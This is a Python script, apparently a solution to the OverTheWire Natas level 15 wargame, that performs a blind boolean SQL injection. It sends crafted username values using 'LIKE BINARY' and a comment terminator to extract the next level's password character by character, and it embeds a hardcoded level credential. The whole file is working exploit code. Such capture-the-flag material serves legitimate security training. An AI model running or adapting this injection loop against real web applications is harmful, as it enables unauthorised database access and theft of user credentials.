#!/usr/bin/python

import httplib2
import urllib
 
h = httplib2.Http()
h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
mystr = "";
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
url = "http://natas15.natas.labs.overthewire.org/index.php?"
method = "POST"

while index < len(charset):
	sqlQuery = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + mystr + charset[index] + "%\" ;# "))
	response, content = h.request(url + sqlQuery, method=method)
	if ("This user exist" in str(content)):
		mystr += charset[index];
		print(mystr)
		index = 0
		continue
	index += 1

print("Done.")